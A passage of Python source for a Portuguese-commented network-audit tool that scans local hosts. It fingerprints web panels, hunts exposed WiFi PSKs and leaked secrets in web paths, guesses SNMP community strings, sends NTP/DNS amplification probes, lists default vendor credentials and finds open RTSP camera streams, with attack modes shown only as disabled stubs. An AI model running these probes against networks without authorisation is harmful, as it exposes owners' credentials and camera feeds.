            web_ports = [p for p in h.get("ports", [])
                         if p in (80, 443, 8080, 8443, 8000, 8888, 8081, 81)]
            if web_ports:
                web_hosts.append((h, web_ports))
        if not web_hosts:
            self.ui.warn("Nenhum host com porta web aberta.")
            return

        connector = aiohttp.TCPConnector(limit=20, ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for host, ports in web_hosts:
                for port in ports:
                    await self._probe_web(session, host, port)
                    await self._probe_api_endpoints(session, host, port)
                    await self._evaluate_login_surface(session, host, port)

    async def _probe_web(self, session, host: Dict, port: int):
        ip = host["ip"]
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{ip}:{port}/"
        try:
            async with session.get(url, ssl=False) as resp:
                text = await resp.text(errors="ignore")
                soup = BeautifulSoup(text, "html.parser")
                title = soup.title.string.strip() if soup.title and soup.title.string else "N/A"
                server = resp.headers.get("Server", "N/A")
                vendor = self._fingerprint_device(title, text, server)
                has_login = bool(soup.find("input", {"type": "password"}))
                host.setdefault("web_info", []).append({
                    "port": port, "title": title, "server": server,
                    "vendor": vendor, "has_login": has_login,
                    "status": resp.status,
                })
                # Caça a PSK / chave WiFi exposta em JS/HTML não-obfuscado
                psk_achados = self._detectar_psk_em_html(text)
                if psk_achados:
                    for p in psk_achados:
                        host.setdefault("psk_leaks", []).append(
                            {"port": port, "tipo": p["tipo"], "psk": p["psk"]})
                    self.ui.error(
                        f"  ⚠ PSK EXPOSTA: {ip}:{port} → "
                        f"{psk_achados[0]['psk'][:8]}*** ({psk_achados[0]['tipo']})")
                label = "[LOGIN]" if has_login else ""
                psk_lbl = " [PSK]" if psk_achados else ""
                self.ui.info(f"  {ip}:{port} — {title} | {server} | {vendor} {label}{psk_lbl}")
        except Exception:
            pass

    def _detectar_psk_em_html(self, html_text: str) -> List[Dict[str, str]]:
        """Procura padrões de PSK/chave WiFi em JS embutido ou HTML.
        Retorna lista de {tipo, psk}. Filtra valores que claramente não são PSK
        (curtos demais, urls, palavras comuns)."""
        achados: List[Dict[str, str]] = []
        if not html_text:
            return achados
        vistas = set()
        for regex, descricao in PSK_PATTERNS:
            try:
                for m in re.finditer(regex, html_text):
                    psk = m.group(1)
                    if not psk or psk in vistas:
                        continue
                    # WPA-PSK válido: 8 a 63 chars; chave hex: 64 chars
                    if not (8 <= len(psk) <= 64):
                        continue
                    # Filtro anti-falso-positivo: ignora valores triviais
                    baixo = psk.lower()
                    if baixo in ("password", "passphrase", "your_password",
                                 "yourpassword", "<password>", "{{password}}",
                                 "********", "xxxxxxxx", "00000000"):
                        continue
                    if psk.startswith(("http://", "https://", "ftp://", "/")):
                        continue
                    vistas.add(psk)
                    achados.append({"tipo": descricao, "psk": psk})
            except re.error:
                continue
        return achados

    def _fingerprint_device(self, title: str, body: str, server: str) -> str:
        # Usa a base global DEVICE_FINGERPRINTS (50+ assinaturas)
        combinado = f"{title} {body[:2000]} {server}".lower()
        for fp in DEVICE_FINGERPRINTS:
            if fp["marker"] in combinado:
                return fp["vendor"]
        return "Unknown"

    async def _probe_api_endpoints(self, session, host: Dict, port: int):
        ip = host["ip"]
        scheme = "https" if port in (443, 8443) else "http"
        for ep in API_ENDPOINTS:
            url = f"{scheme}://{ip}:{port}{ep}"
            try:
                async with session.get(url, ssl=False) as resp:
                    if resp.status < 400:
                        host.setdefault("api_endpoints", []).append(
                            {"path": ep, "status": resp.status, "port": port})
                        self.ui.success(f"  API: {ip}:{port}{ep} → {resp.status}")
            except Exception:
                pass

    async def _evaluate_login_surface(self, session, host: Dict, port: int):
        web_info = host.get("web_info", [])
        port_info = next((w for w in web_info if w["port"] == port), None)
        if not port_info or not port_info.get("has_login"):
            return
        ip = host["ip"]
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{ip}:{port}/"
        auth_headers = 0
        auth_basic = 0
        try:
            async with session.get(url, ssl=False) as resp:
                headers = {k.lower(): v for k, v in resp.headers.items()}
                auth_hdr = headers.get("www-authenticate", "")
                if auth_hdr:
                    auth_headers = 1
                if "basic" in auth_hdr.lower():
                    auth_basic = 1
        except Exception:
            pass
        host.setdefault("login_surfaces", []).append({
            "ip": ip,
            "port": port,
            "url": url,
            "auth_header_present": bool(auth_headers),
            "basic_auth_present": bool(auth_basic),
        })

    async def _sondar_servicos_amplificacao(self):
        """Probes leves: SNMP (várias comunidades), NTP monlist, DNS version.bind."""
        self.ui.info("Sondando serviços de amplificação (SNMP/NTP/DNS)...")
        loop = asyncio.get_event_loop()
        for host in self.hosts:
            portas = set(host.get("ports", []))
            ip = host["ip"]
            if 161 in portas:
                try:
                    resultado = await loop.run_in_executor(None, self._snmp_communities, ip)
                    if resultado:
                        community, sys_descr = resultado
                        host.setdefault("amplificacao", []).append(
                            {"servico": "snmp", "evidencia": f"community '{community}' aceita: {sys_descr[:60]}"})
                        host.setdefault("snmp_creds", []).append(
                            {"community": community, "sys_descr": sys_descr[:120]})
                except Exception:
                    pass
            if 123 in portas:
                try:
                    resp = await loop.run_in_executor(None, self._ntp_monlist, ip)
                    if resp:
                        host.setdefault("amplificacao", []).append(
                            {"servico": "ntp", "evidencia": "monlist respondeu"})
                except Exception:
                    pass
            if 53 in portas:
                try:
                    resp = await loop.run_in_executor(None, self._dns_version, ip)
                    if resp:
                        host.setdefault("amplificacao", []).append(
                            {"servico": "dns", "evidencia": resp[:80]})
                except Exception:
                    pass

    def _montar_pacote_snmp(self, community: str) -> bytes:
        """Constrói SNMPv1 GetRequest para sysDescr.0 (1.3.6.1.2.1.1.1.0)
        com community arbitrária. Retorna BER cru."""
        c = community.encode("ascii", errors="ignore")
        # Varbind: OID sysDescr.0 (8 bytes) + NULL
        oid = bytes.fromhex("06082b06010201010100")
        valor_null = bytes.fromhex("0500")
        vb_inner = oid + valor_null
        vb = b"\x30" + bytes([len(vb_inner)]) + vb_inner
        vbs_inner = vb
        vbs = b"\x30" + bytes([len(vbs_inner)]) + vbs_inner
        # PDU body: request-id (4 bytes), error-status, error-index, varbinds
        pdu_body = (b"\x02\x04\x17\x00\x00\x00"
                    b"\x02\x01\x00"
                    b"\x02\x01\x00" + vbs)
        pdu = b"\xa0" + bytes([len(pdu_body)]) + pdu_body
        # Top: version (0 = SNMPv1) + community + PDU
        top = (b"\x02\x01\x00"
               + b"\x04" + bytes([len(c)]) + c
               + pdu)
        return b"\x30" + bytes([len(top)]) + top

    def _snmp_communities(self, ip: str) -> Optional[Tuple[str, str]]:
        """Testa SNMP_COMMUNITIES até a primeira aceita. Retorna
        (community, sys_descr) ou None."""
        for community in SNMP_COMMUNITIES:
            try:
                pacote = self._montar_pacote_snmp(community)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1.0)
                s.sendto(pacote, (ip, 161))
                data, _ = s.recvfrom(2048)
                s.close()
                if not data or b"\xa2" not in data[:64]:
                    continue
                # Resposta válida (PDU GetResponse 0xA2). Extrai sysDescr ASCII.
                ascii_chunks = re.findall(rb"[\x20-\x7e]{6,}", data)
                # Filtra a própria community do retorno
                relevantes = [c.decode("ascii", errors="ignore")
                              for c in ascii_chunks
                              if c.decode("ascii", errors="ignore") != community]
                sys_descr = relevantes[0] if relevantes else "snmp_ok"
                return (community, sys_descr)
            except Exception:
                continue
        return None

    def _ntp_monlist(self, ip: str) -> bool:
        """Mode 7 monlist request — se responder, está vulnerável a amplificação."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1.5)
            pacote = b"\x17\x00\x03\x2a" + b"\x00" * 4
            s.sendto(pacote, (ip, 123))
            data, _ = s.recvfrom(2048)
            s.close()
            return len(data) > 8
        except Exception:
            return False

    def _dns_version(self, ip: str) -> str:
        """Query CHAOS TXT version.bind."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1.5)
            pacote = (
                b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                b"\x07version\x04bind\x00\x00\x10\x00\x03"
            )
            s.sendto(pacote, (ip, 53))
            data, _ = s.recvfrom(512)
            s.close()
            ascii_chunks = re.findall(rb"[\x20-\x7e]{4,}", data[12:])
            return ascii_chunks[0].decode("ascii", errors="ignore") if ascii_chunks else "dns_resp"
        except Exception:
            return ""

    async def _sondar_paths_default(self):
        """Sonda paths críticos (admin + segredos). Para cada hit < 400, lê os
        primeiros 4 KB do body e cruza contra LEAK_PATTERNS para confirmar
        vazamento real. Hits sem confirmação ficam como `paths_default`,
        hits confirmados viram `secret_leaks` (severidade crítica)."""
        if not HAS_AIOHTTP:
            return
        # Paths administrativos (status 200 já é finding, sem precisar confirmar body)
        paths_admin = ["/phpmyadmin/", "/wp-admin/", "/manager/html",
                       "/server-status", "/server-info", "/HNAP1/",
                       "/jmx-console", "/console", "/actuator/health"]
        # Paths que vazam segredos — exigem confirmação no body
        paths_segredos = SECRET_PATHS

        web_hosts = [h for h in self.hosts
                     if any(p in h.get("ports", []) for p in (80, 443, 8080, 8443))]
        if not web_hosts:
            return
        self.ui.info(f"Caça a segredos: {len(paths_admin) + len(paths_segredos)} paths "
                     f"em {len(web_hosts)} hosts web...")
        timeout = aiohttp.ClientTimeout(total=2)
        conn = aiohttp.TCPConnector(limit=30, ssl=False, force_close=True)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as ses:
            for host in web_hosts:
                ip = host["ip"]
                porta = next((p for p in (80, 8080, 443, 8443) if p in host.get("ports", [])), 80)
                esquema = "https" if porta in (443, 8443) else "http"
                base = f"{esquema}://{ip}:{porta}"

                # 1) Paths administrativos — só status code importa
                for path in paths_admin:
                    try:
                        async with ses.get(base + path, ssl=False, allow_redirects=False) as resp:
                            if resp.status < 400:
                                host.setdefault("paths_default", []).append(
                                    {"path": path, "status": resp.status})
                    except Exception:
                        continue

                # 2) Paths de segredos — leem o body e cruzam com LEAK_PATTERNS
                for path in paths_segredos:
                    try:
                        async with ses.get(base + path, ssl=False, allow_redirects=False) as resp:
                            if resp.status >= 400:
                                continue
                            ct = resp.headers.get("Content-Type", "").lower()
                            # Pula HTML genérico (404 personalizado disfarçado de 200)
                            if "text/html" in ct and resp.status == 200 and path.startswith("/."):
                                # arquivos dotfile não devem retornar HTML; provável armadilha
                                pass
                            body_bytes = await resp.content.read(4096)
                            body = body_bytes.decode("utf-8", errors="ignore")
                            evidencias = self._extrair_leaks(body)
                            if evidencias:
                                host.setdefault("secret_leaks", []).append({
                                    "path": path,
                                    "status": resp.status,
                                    "achados": evidencias,
                                    "tamanho_bytes": len(body_bytes),
                                })
                                self.ui.error(
                                    f"  ⚠ LEAK: {ip}:{porta}{path} → "
                                    f"{', '.join(e['tipo'] for e in evidencias)}")
                            else:
                                # Status 200 num path sensível, mas sem padrão confirmado:
                                # registramos como "exposição" (atenção, não crítico).
                                host.setdefault("paths_default", []).append(
                                    {"path": path, "status": resp.status})
                    except Exception:
                        continue

    def _extrair_leaks(self, body: str) -> List[Dict[str, str]]:
        """Aplica LEAK_PATTERNS no body. Retorna lista de achados confirmados."""
        achados: List[Dict[str, str]] = []
        if not body:
            return achados
        for regex, descricao in LEAK_PATTERNS:
            try:
                m = re.search(regex, body)
                if m:
                    # Trecho mascarado (mostra só os primeiros 8 chars do segredo)
                    trecho = m.group(0)
                    if len(trecho) > 80:
                        trecho = trecho[:80] + "..."
                    achados.append({"tipo": descricao, "trecho": trecho})
            except re.error:
                continue
        return achados

    def _sugerir_creds_padrao(self):
        """Cruza vendor identificado (web fingerprint OU MAC vendor) com
        DEFAULT_CREDS para sugerir credenciais padrão prováveis. Passivo:
        nenhuma tentativa de login é feita, apenas registra a sugestão."""
        # Mapa de aliases vendor → chave em DEFAULT_CREDS (em minúsculas)
        aliases = {
            "tp-link": "tp-link", "tplink": "tp-link",
            "dahua": "dahua", "hikvision": "hikvision",
            "asus": "asus", "asustek": "asus",
            "mikrotik": "mikrotik", "routeros": "mikrotik",
            "d-link": "d-link", "dlink": "d-link",
            "linksys": "linksys", "cisco": "cisco", "cisco-linksys": "cisco",
            "huawei": "huawei", "xiaomi": "xiaomi",
            "tenda": "tenda", "zte": "zte",
            "ubiquiti": "ubiquiti", "unifi": "ubiquiti",
            "axis": "axis", "foscam": "foscam", "reolink": "reolink",
            "amcrest": "amcrest", "netgear": "netgear",
            "synology": "synology", "qnap": "qnap",
            "intelbras": "intelbras", "fortinet": "fortinet",
        }

        for host in self.hosts:
            vendores: Set[str] = set()
            # 1) Vendor obtido via fingerprint web (mais confiável)
            for w in host.get("web_info", []):
                v = (w.get("vendor") or "").strip().lower()
                if v and v != "unknown":
                    vendores.add(v)
            # 2) Vendor obtido via MAC OUI (fallback)
            mac_vendor = (host.get("vendor") or "").strip().lower()
            if mac_vendor and mac_vendor not in ("unknown", "n/a", ""):
                vendores.add(mac_vendor)

            sugestoes: List[Dict[str, Any]] = []
            for v in vendores:
                chave = aliases.get(v)
                if not chave or chave not in DEFAULT_CREDS:
                    continue
                pares = DEFAULT_CREDS[chave]
                if not pares:
                    continue
                sugestoes.append({
                    "vendor_detectado": v,
                    "chave_banco": chave,
                    "pares": [f"{u}:{p}" if p else f"{u}:(vazio)" for u, p in pares],
                    "fonte": "web_info" if v != mac_vendor else "mac_oui",
                })
            # Sempre inclui as credenciais genéricas como ponto de atenção mínimo
            # se houver painel de login detectado
            tem_login = any(w.get("has_login") for w in host.get("web_info", []))
            if tem_login and not sugestoes:
                pares = DEFAULT_CREDS.get("generic", [])
                if pares:
                    sugestoes.append({
                        "vendor_detectado": "genérico",
                        "chave_banco": "generic",
                        "pares": [f"{u}:{p}" if p else f"{u}:(vazio)" for u, p in pares[:6]],
                        "fonte": "login_panel",
                    })
            if sugestoes:
                host["creds_padrao_sugeridas"] = sugestoes

    def _assess_risks(self):
        findings: List[Dict[str, Any]] = []
        for host in self.hosts:
            ip = host["ip"]
            ports = set(host.get("ports", []))
            issues: List[str] = []
            score = 0

            if 23 in ports:
                issues.append("Telnet exposto")
                score += 35
            if 21 in ports:
                issues.append("FTP exposto")
                score += 20
            if 445 in ports:
                issues.append("SMB exposto")
                score += 15
            if 3389 in ports:
                issues.append("RDP exposto")
                score += 20
            if 554 in ports:
                issues.append("RTSP exposto")
                score += 20
            if 161 in ports:
                issues.append("SNMP exposto")
                score += 10
            if 53 in ports:
                issues.append("DNS exposto")
                score += 5
            if 123 in ports:
                issues.append("NTP exposto")
                score += 5
            if 6379 in ports:
                issues.append("Redis exposto")
                score += 25
            if 27017 in ports:
                issues.append("MongoDB exposto")
                score += 25
            if 9200 in ports:
                issues.append("Elasticsearch exposto")
                score += 25
            if 2375 in ports:
                issues.append("Docker API exposta")
                score += 30

            for web in host.get("web_info", []):
                if web.get("has_login"):
                    issues.append(f"Painel de login na porta {web.get('port')}")
                    score += 15
                if web.get("status", 0) >= 500:
                    issues.append(f"Instabilidade web na porta {web.get('port')}")
                    score += 5
                vendor = (web.get("vendor") or "Unknown").lower()
                if vendor != "unknown":
                    issues.append(f"Fingerprint IoT/vendor: {web.get('vendor')}")
                    score += 5

            if host.get("api_endpoints"):
                issues.append(f"API endpoints acessíveis: {len(host.get('api_endpoints', []))}")
                score += 15

            for amp in host.get("amplificacao", []):
                issues.append(f"Amplificação {amp['servico'].upper()}: {amp['evidencia']}")
                score += 12

            for pth in host.get("paths_default", []):
                issues.append(f"Path default acessível {pth['path']} ({pth['status']})")
                score += 10

            # Vazamentos confirmados em paths sensíveis (LEAK_PATTERNS)
            for leak in host.get("secret_leaks", []) or []:
                tipos = ", ".join(a["tipo"] for a in leak.get("achados", []))
                issues.append(f"[CRÍTICO] Vazamento em {leak['path']}: {tipos}")
                score += 30 * len(leak.get("achados", [])) or 30

            # PSK / chave WiFi vazada em página de status do roteador
            for psk in host.get("psk_leaks", []) or []:
                issues.append(f"[CRÍTICO] PSK WiFi exposta na porta {psk['port']} ({psk['tipo']})")
                score += 35

            # SNMP comunidades aceitas além de public
            for snmp in host.get("snmp_creds", []) or []:
                comm = snmp.get("community", "")
                if comm == "public":
                    score += 5  # já contado em "SNMP exposto"
                else:
                    issues.append(f"[ALTO] SNMP community '{comm}' aceita — potencial leitura/escrita")
                    score += 25

            # Sugestões de credenciais padrão (informativo, sem exploit)
            for sug in host.get("creds_padrao_sugeridas", []) or []:
                amostras = ", ".join(sug["pares"][:3])
                issues.append(f"[INFO] Modelo '{sug['vendor_detectado']}' → "
                              f"creds padrão prováveis: {amostras}")
                score += 5

            # Absorve vulns identificadas pelo PortScanner --Insane
            for v in host.get("vulns", []) or []:
                sev = v.get("severidade", "info")
                inc = {"critica": 25, "alta": 15, "media": 8, "info": 3}.get(sev, 3)
                score += inc
                issues.append(f"[{sev.upper()}] {v.get('dica_cve', '')[:80]}")

            # Findings vindos do boost --root
            for rf in host.get("root_findings", []) or []:
                tipo = rf.get("tipo", "")
                sev = rf.get("severidade", "media")
                inc = {"alta": 25, "media": 12, "info": 5}.get(sev, 8)
                score += inc
                issues.append(f"[ROOT/{sev.upper()}] {tipo}: {rf.get('evidencia', '')[:80]}")

            if not issues:
                continue
            findings.append({
                "ip": ip,
                "score": min(score, 100),
                "severity": "high" if score >= 60 else ("medium" if score >= 30 else "low"),
                "issues": issues,
            })

        self.risk_findings = sorted(findings, key=lambda x: x["score"], reverse=True)

    async def _rtsp_discovery(self):
        self.ui.info("RTSP Stream Discovery...")
        rtsp_hosts = [h for h in self.hosts if 554 in h.get("ports", [])]
        if not rtsp_hosts:
            self.ui.warn("Nenhum host com RTSP (554) aberto.")
            return
        for host in rtsp_hosts:
            ip = host["ip"]
            for path in RTSP_PATHS:
                if await self._test_rtsp(ip, path):
                    stream = {"ip": ip, "path": path, "url": f"rtsp://{ip}{path}"}
                    self.rtsp_streams.append(stream)
                    self.ui.success(f"  RTSP: rtsp://{ip}{path}")

    async def _test_rtsp(self, ip: str, path: str) -> bool:
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(ip, 554), timeout=3)
            req = f"DESCRIBE rtsp://{ip}{path} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
            w.write(req.encode())
            await w.drain()
            data = await asyncio.wait_for(r.read(512), timeout=3)
            w.close()
            await w.wait_closed()
            resp = data.decode(errors="ignore")
            return "200 OK" in resp
        except Exception:
            return False

    def _print_god_summary(self):
        if self.risk_findings:
            rows = [[r["ip"], str(r["score"]), r["severity"], "; ".join(r["issues"][:2])]
                    for r in self.risk_findings[:25]]
            self.ui.table("Risk Findings",
                          [("IP", C_RED), ("Score", C_YELLOW), ("Severity", C_WHITE), ("Top Issues", C_DIM)],
                          rows)
        if self.rtsp_streams:
            rows = [[s["ip"], s["url"]] for s in self.rtsp_streams]
            self.ui.table("RTSP Streams",
                           [("IP", C_GREEN), ("URL", C_CYAN)], rows)
        if self.ssdp_devices:
            rows = [[d.get("ip", "?"), d.get("server", d.get("st", "?"))]
                    for d in self.ssdp_devices[:20]]
            self.ui.table("SSDP Devices",
                           [("IP", C_GREEN), ("Service", C_CYAN)], rows)
        if self.onvif_devices:
            rows = [[d.get("ip", "?"), d.get("model", "?"), d.get("firmware", "?")]
                    for d in self.onvif_devices[:20]]
            self.ui.table("ONVIF Cameras",
                           [("IP", C_GREEN), ("Model", C_CYAN), ("Firmware", C_YELLOW)], rows)

    async def run_onvif(self):
        self.ui.section("ONVIF WS-DISCOVERY")
        msg = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<Envelope xmlns="http://www.w3.org/2003/05/soap-envelope" xmlns:dn="http://www.onvif.org/ver10/network/wsdl">'
            '<Header><wsa:MessageID xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">uuid:11111111-2222-3333-4444-555555555555</wsa:MessageID>'
            '<wsa:To xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>'
            '<wsa:Action xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action></Header>'
            '<Body><Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
            '<Types>dn:NetworkVideoTransmitter</Types>'
            '<Scopes /></Probe></Body></Envelope>'
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(3)
            sock.sendto(msg.encode(), ("239.255.255.250", 3702))
            while True:
                try:
                    data, addr = sock.recvfrom(4096)
                    resp = data.decode(errors="ignore")
                    if "ProbeMatch" in resp:
                        m_model = re.search(r'hardware/([^/<\s]+)', resp)
                        m_firm = re.search(r'firmware/([^/<\s]+)', resp)
                        cam = {
                            "ip": addr[0],
                            "model": m_model.group(1) if m_model else "Unknown",
                            "firmware": m_firm.group(1) if m_firm else "Unknown"
                        }
                        if not any(d["ip"] == cam["ip"] for d in self.onvif_devices):
                            self.onvif_devices.append(cam)
                            self.ui.success(f"  [ONVIF] {cam['ip']} — {cam['model']} (FW: {cam['firmware']})")
                except socket.timeout:
                    break
            sock.close()
        except Exception as e:
            self.ui.error(f"Erro no ONVIF: {e}")

    async def run_slowloris(self):
        self.ui.warn("Modo --slowloris desativado por seguranca.")

    async def run_rtsp_kill(self):
        self.ui.warn("Modo --rtsp-kill desativado por seguranca.")

    async def run_mirai(self):
        self.ui.warn("Modo --mirai desativado por seguranca.")


# ═══════════════════ REPORT ENGINE ════════════════════════════

class ReportEngine:
    """Generates cyberpunk HTML report and executive TXT summary."""

    def __init__(self, ui: TerminalUI, detector: NetworkDetector,
                 hosts: List[Dict], stress_results: Dict = None,
                 god_data: Dict = None,
                 kamikase_data: Dict = None,
                 ctx_priv: "Optional[ContextoPrivilegio]" = None):
        self.ui = ui
        self.det = detector
        self.hosts = hosts
        self.stress = stress_results or {}
        self.god = god_data or {}
        self.kamikase = kamikase_data or {}
        self.ctx_priv = ctx_priv
        self.timestamp = datetime.now()

    def generate(self):
        self.ui.section("REPORT GENERATION")
        out_dir = self.det.output_dir or Path(".")
        html_path = out_dir / f"report_{self.timestamp.strftime('%Y-%m-%d_%Hh%M')}.html"
        txt_path = out_dir / f"{self.det.ssid or 'scan'}_{self.timestamp.strftime('%Y-%m-%d')}.txt"
        self._write_html(html_path)
        self._write_txt(txt_path)
        self.ui.success(f"HTML: {html_path}")
        self.ui.success(f"TXT:  {txt_path}")

    # ── Helpers didáticos: explicações inline e exemplos ──────

    def _explicacao_html(self, chave: str, exemplo: str = "") -> str:
        """Bloco <details> colapsável explicando um tipo de achado.
        `exemplo` é o trecho específico desta varredura — quando passado,
        aparece como 'Exemplo encontrado nesta rede'."""
        info = EXPLICACOES.get(chave)
        if not info:
            return ""
        ex_html = ""
        if exemplo:
            ex_html = (f"<p><strong>Exemplo encontrado:</strong> "
                       f"<code>{html.escape(exemplo[:300])}</code></p>")
        return (
            f'<details class="didatica"><summary>📖 O que é "{html.escape(info["titulo"])}" '
            f'e como validar</summary>'
            f'<p><strong>Resumo:</strong> {html.escape(info["resumo"])}</p>'
            f'<p><strong>Como validar manualmente:</strong> {html.escape(info["como_validar"])}</p>'
            f'<p><strong>Impacto:</strong> {html.escape(info["impacto"])}</p>'
            f'{ex_html}'
            f'</details>'
        )

    def _explicacao_txt(self, chave: str, indent: str = "  ") -> List[str]:
        """Bloco textual padronizado para explicar um tipo de achado no TXT."""
        info = EXPLICACOES.get(chave)
        if not info:
            return []
        return [
            f"{indent}─ {info['titulo']} ─",
            f"{indent}  • O que é: {info['resumo']}",
            f"{indent}  • Como validar: {info['como_validar']}",
            f"{indent}  • Impacto: {info['impacto']}",
        ]

    def _classificar_finding_para_explicacao(self, issue_text: str) -> Optional[str]:
        """Mapeia uma string de issue (do _assess_risks) para uma chave em
        EXPLICACOES. Retorna None se não encontrar correspondência."""
        t = issue_text.lower()
        if "telnet" in t and "expost" in t: return "porta_telnet"
        if "ftp" in t and "expost" in t: return "porta_ftp"
        if "smb" in t and "expost" in t: return "porta_smb"
        if "rdp" in t and "expost" in t: return "porta_rdp"
        if "rtsp" in t and "expost" in t: return "porta_rtsp"
        if "snmp" in t and ("community" in t or "private" in t or "expost" in t):
            return "snmp_community_extra" if "community" in t else "porta_snmp"
        if "dns" in t and "expost" in t: return "porta_dns"
        if "ntp" in t and "expost" in t: return "porta_ntp"
        if "redis" in t: return "porta_redis"
        if "mongo" in t: return "porta_mongo"
        if "elastic" in t: return "porta_elastic"
        if "docker" in t: return "porta_docker"
        if "vazamento" in t or "leak" in t: return "secret_leak"
        if "psk" in t: return "psk_exposto"
        if "creds padrão" in t or "creds padrao" in t: return "creds_padrao"
        if "amplificação" in t or "amplificacao" in t: return "amplificacao"
        if "path default" in t: return "path_default"
        if "headers de segurança" in t: return "headers_seguranca"
        if "openssh" in t: return "ssh_versao_antiga"
        if "[crítico]" in t or "[critico]" in t: return "vuln_critica"
        if "[alto]" in t: return "vuln_alta"
        if "[médio]" in t or "[medio]" in t: return "vuln_media"
        if "[info]" in t: return "vuln_info"
        return None

    def _coletar_chaves_explicacao(self) -> List[str]:
        """Varre todos os achados deste scan e retorna a lista de tipos
        (chaves de EXPLICACOES) que efetivamente apareceram. Usado para
        construir o glossário do TXT só com o que é relevante."""
        chaves: Set[str] = set()
        # Vulns por severidade
        for h in self.hosts:
            for v in h.get("vulns", []) or []:
                sev = v.get("severidade", "info")
                chaves.add(f"vuln_{sev}")
            if h.get("secret_leaks"): chaves.add("secret_leak")
            if h.get("psk_leaks"): chaves.add("psk_exposto")
            for snmp in h.get("snmp_creds", []) or []:
                if snmp.get("community", "") != "public":
                    chaves.add("snmp_community_extra")
                else:
                    chaves.add("porta_snmp")
            if h.get("creds_padrao_sugeridas"): chaves.add("creds_padrao")
            if h.get("amplificacao"): chaves.add("amplificacao")
            if h.get("paths_default"): chaves.add("path_default")
            ports = set(h.get("ports", []))
            for porta, chave in [(23, "porta_telnet"), (21, "porta_ftp"),
                                 (445, "porta_smb"), (3389, "porta_rdp"),
                                 (554, "porta_rtsp"), (53, "porta_dns"),
                                 (123, "porta_ntp"), (6379, "porta_redis"),
                                 (27017, "porta_mongo"), (9200, "porta_elastic"),
                                 (2375, "porta_docker")]:
                if porta in ports:
                    chaves.add(chave)
        if self.stress.get("godfall"): chaves.add("godfall_resultado")
        if self.ctx_priv and self.ctx_priv.ativo: chaves.add("privilegio_root")
        if self.kamikase.get("ativo"): chaves.add("kamikase")
        # Detecta tipos de root_findings presentes
        for h in self.hosts:
            for rf in h.get("root_findings", []) or []:
                tipo = rf.get("tipo", "")
                if tipo == "arp_spoof_detected": chaves.add("arp_spoofing_detect")
                elif tipo == "lldp_cdp": chaves.add("lldp_cdp")
                elif tipo == "dns_cache_snoop": chaves.add("dns_snooping")
        chaves.add("inventario_hosts")
        return sorted(chaves)

    def _write_html(self, path: Path):
        risks = self.god.get("risks", [])
        risk_map = {r["ip"]: r for r in risks}
        godfall = self.stress.get("godfall", {})
        lat = self.stress.get("latency", {})
        open_ports = sum(len(h.get("ports", [])) for h in self.hosts)

        hosts_rows = ""
        for h in self.hosts:
            ports_str = ", ".join(str(p) for p in h.get("ports", [])[:15])
            svcs = ", ".join(f"{p}:{s.get('service','?')}"
                             for p, s in list(h.get("services", {}).items())[:8])
            web_titles = " ".join(w.get("title", "") for w in h.get("web_info", []))
            risk = risk_map.get(h["ip"], {})
            hostname = h.get("hostname", "") or "—"
            tipo = h.get("device_type", "desconhecido")
            confs = h.get("confiancas", {})
            conf_avg = (sum(confs.values()) // max(1, len(confs))) if confs else 0
            fontes = ", ".join(h.get("fontes", [])) or "—"
            hosts_rows += f"""<tr>
                <td>{html.escape(h['ip'])}</td>
                <td>{html.escape(hostname)}</td>
                <td><span class="badge tipo-{html.escape(tipo)}">{html.escape(tipo)}</span></td>
                <td>{html.escape(h.get('mac','N/A'))}</td>
                <td>{html.escape(h.get('vendor','?'))}</td>
                <td>{html.escape(h.get('os','?'))}</td>
                <td>{html.escape(ports_str)}</td>
                <td>{html.escape(svcs)}</td>
                <td>{html.escape(web_titles.strip()[:40])}</td>
                <td>{conf_avg}%</td>
                <td>{risk.get('score', 0)}</td>
                <td class="meta">{html.escape(fontes)}</td></tr>"""

        # Card de Vulnerabilidades (vindas do --Insane)
        vuln_rows = ""
        total_vulns = 0
        for h in self.hosts:
            for v in h.get("vulns", []) or []:
                total_vulns += 1
                sev = v.get("severidade", "info")
                vuln_rows += (
                    f"<tr class='sev-{html.escape(sev)}'>"
                    f"<td>{html.escape(h['ip'])}</td>"
                    f"<td>{v.get('porta', '?')}</td>"
                    f"<td>{html.escape(v.get('servico', '?'))}</td>"
                    f"<td><span class='badge sev-{html.escape(sev)}'>{html.escape(sev.upper())}</span></td>"
                    f"<td>{html.escape(v.get('dica_cve', '')[:120])}</td>"
                    f"<td>{'sim' if v.get('verificada') else 'não'}</td></tr>"
                )
        vuln_section = ""
        if vuln_rows:
            # Coleta as severidades que apareceram para mostrar didática só do relevante
            sevs_presentes = sorted({(v.get("severidade", "info"))
                                      for h in self.hosts
                                      for v in h.get("vulns", []) or []})
            blocos_sev = "".join(self._explicacao_html(f"vuln_{s}") for s in sevs_presentes)
            vuln_section = f"""<div class="card"><h2>Vulnerabilidades (Insane)</h2>
            <p class="meta">Total de achados: {total_vulns}</p>
            <div class="didatica-wrap">
